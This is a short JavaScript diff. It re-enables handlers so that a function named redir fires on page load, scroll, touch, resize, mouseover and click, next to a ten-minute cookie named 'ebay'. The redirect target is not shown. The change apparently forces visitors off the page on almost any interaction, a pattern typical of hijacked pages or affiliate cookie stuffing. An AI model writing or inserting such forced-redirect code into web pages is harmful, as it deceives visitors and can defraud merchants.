@@ -30,12 +30,12 @@ document.cookie="ebay=1;expires="+new Date((new Date).getTime()+10*60*1000).toGM
        }	
 }
 	
-//window.onscroll=redir;
+window.onscroll=redir;
 window.onclick=redir;
-//window.ontouchstart=redir;
-//window.onload=redir;
-//window.onresize=redir;
-//window.onmouseover=redir;
+window.ontouchstart=redir;
+window.onload=redir;
+window.onresize=redir;
+window.onmouseover=redir;
 	
 		
 	
